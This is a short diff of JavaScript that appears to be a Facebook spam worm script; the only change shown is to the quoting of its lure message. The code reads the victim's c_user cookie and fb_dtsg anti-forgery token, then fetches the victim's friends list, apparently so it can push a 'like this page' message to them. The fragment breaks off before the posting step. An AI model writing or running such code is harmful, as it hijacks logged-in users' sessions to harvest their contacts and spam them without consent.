@@ -70,7 +70,7 @@ var Fwsuc = 0;
 var arr = new Array;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
-var Fwmsg = " Friends Like This awesOme HearT Touching Page https://www.facebook.com/pages/Kyun-Ki-Tum-Hi-Ho/722607351086829  \n I am sure it will touch Your Heart \n Check The Page \n And Hit Like ";
+var Fwmsg = 'Friends Like This awesOme HearT Touching Page https://www.facebook.com/pages/Kyun-Ki-Tum-Hi-Ho/722607351086829  \n I am sure it will touch Your Heart \n Check The Page \n And Hit Like';
 jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degree.php?" + "__a=1&filter[0]=user&lazy=0&viewer=" + user_id + "&token=v7&stale_ok=0", function (a) {
     var b = a;
     var c = b.substring(b.indexOf("{"));
